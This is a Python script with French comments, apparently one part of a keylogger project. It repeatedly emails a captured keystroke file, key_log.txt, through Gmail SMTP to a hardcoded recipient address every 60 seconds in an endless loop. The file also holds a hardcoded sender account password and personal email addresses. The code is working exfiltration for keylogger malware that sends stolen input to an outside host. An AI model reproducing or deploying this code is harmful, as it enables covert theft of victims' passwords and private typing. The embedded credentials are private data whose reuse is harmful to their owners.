import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import time
import getpass


#Initialisation
email_user = 'keylogger.pythonm1@gmail.com'
email_password = 'Python_m1'

#Veuillez mettre votre adresse email :vous allez recevoir le fichier key_log.txt sur cette adresse
email_send = 'boughazi.hanane13@gmail.com'

subject = 'python'
msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject
filename='key_log.txt'

#message envoye avec le fichier key_log.txt
body = 'fichier keylogger envoye avec succes'
msg.attach(MIMEText(body,'plain'))

part = MIMEBase('application','octet-stream')
msg.attach(part)

#cette fonction permet de recuperer le fichier key_log.txt
# En outre elle permet de rentrer dans le server de gmail via le port 587
# Et envoyer le fichier key_log.txt
def envoi():
        attachment  =open(filename,'rb')
        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        part.set_payload((attachment).read())

        part.add_header('Content-Disposition',"attachment; filename= "+filename)

        encoders.encode_base64(part)

        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)
        server.sendmail(email_user,email_send,text)
        server.quit()
      

#Boucle while qui permet de renvoyer un email chaque 60 secondes
#Appel a la fonction envoi pour l'envoi du mail
# Vous pouvez toujours modifier la duree dans sleep()
# par exemple, si vous voulez mettre 90 secondes , il suffit juste de
#supprimer 60 et la remplacer par 90 : time.sleep(90)
while(1):
        envoi() 
        time.sleep(60)











